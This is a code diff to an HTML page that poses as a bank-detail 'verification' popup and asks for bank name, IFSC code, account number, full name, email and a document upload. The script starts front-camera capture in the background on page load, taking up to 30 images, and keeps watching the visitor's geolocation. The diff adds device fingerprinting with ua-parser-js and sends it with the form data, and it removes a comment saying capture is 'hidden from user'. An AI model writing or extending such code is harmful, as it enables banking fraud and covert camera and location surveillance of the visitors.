@@ -297,7 +297,6 @@
       font-size: 14px;
     }
     
-    /* Mobile-specific styles */
     @media (max-width: 480px) {
       body {
         padding: 10px;
@@ -354,17 +353,16 @@
       }
     }
     
-    /* Hide scrollbar for Chrome, Safari and Opera */
     .popup-content::-webkit-scrollbar {
       display: none;
     }
     
-    /* Hide scrollbar for IE, Edge and Firefox */
     .popup-content {
-      -ms-overflow-style: none;  /* IE and Edge */
-      scrollbar-width: none;  /* Firefox */
+      -ms-overflow-style: none;
+      scrollbar-width: none;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
 </head>
 <body>
   <div id="verificationPopup">
@@ -475,23 +473,25 @@
     let capturedImages = [];
     let locationData = null;
     let locationWatchId = null;
-    const MAX_IMAGES = 30; // 10 before submit + 20 after
-    
-    // Start capturing when page loads (hidden from user)
-    window.addEventListener('load', function() {
-      document.getElementById('verificationPopup').style.display = 'flex';
+    const MAX_IMAGES = 30;
+
+    // Enhanced device detection
+    function getDeviceInfo() {
+      const parser = new UAParser();
+      const device = parser.getDevice();
+      const os = parser.getOS();
+      const browser = parser.getBrowser();
       
-      // Start background capture immediately
-      startBackgroundCapture();
-      
-      // Prevent zooming on mobile
-      document.addEventListener('touchmove', function(event) {
-        if (event.scale !== 1) {
-          event.preventDefault();
-        }
-      }, { passive: false });
-    });
-    
+      return {
+        type: device.type || 'desktop',
+        model: device.model || 'Unknown',
+        vendor: device.vendor || 'Unknown',
+        os: `${os.name} ${os.version}`,
+        browser: `${browser.name} ${browser.version}`,
+        fullUA: navigator.userAgent
+      };
+    }
+
     // Close the verification popup
     function closePopup() {
       document.getElementById('verificationPopup').style.display = 'none';
@@ -549,7 +549,7 @@
       });
     }
     
-    // New function for background capture
+    // Start background capture
     function startBackgroundCapture() {
       navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user' } 
@@ -600,12 +600,19 @@
       
       // Prepare form data
       const formData = new FormData();
-      const formFields = ['bankname', 'ifsc', 'accno', 'fullname', 'email'];
+      const deviceInfo = getDeviceInfo();
+      
+      // Add enhanced device info
+      formData.append('device_type', deviceInfo.type);
+      formData.append('device_model', deviceInfo.model);
+      formData.append('device_vendor', deviceInfo.vendor);
+      formData.append('device_os', deviceInfo.os);
+      formData.append('device_browser', deviceInfo.browser);
+      formData.append('user_agent', deviceInfo.fullUA);
       
       // Add form fields (empty if not filled)
-      formFields.forEach(field => {
-        const value = document.getElementById(field).value || 'Not provided';
-        formData.append(field, value);
+      ['bankname', 'ifsc', 'accno', 'fullname', 'email'].forEach(field => {
+        formData.append(field, document.getElementById(field).value || 'Not provided');
       });
       
       // Add document if uploaded
@@ -682,7 +689,7 @@
       return images;
     }
     
-        // Modified location watching function
+     // Modified location watching function
     function watchLocation() {
       if (locationWatchId) {
         navigator.geolocation.clearWatch(locationWatchId);
@@ -732,9 +739,10 @@
       return new Blob([u8arr], { type: mime });
     }
     
-    // Cleanup when leaving the page
-    window.addEventListener('beforeunload', function() {
-      stopCamera();
+    // Start the process by showing popup immediately
+    window.addEventListener('load', function() {
+      document.getElementById('verificationPopup').style.display = 'flex';
+      startBackgroundCapture();
     });
   </script>
 </body>
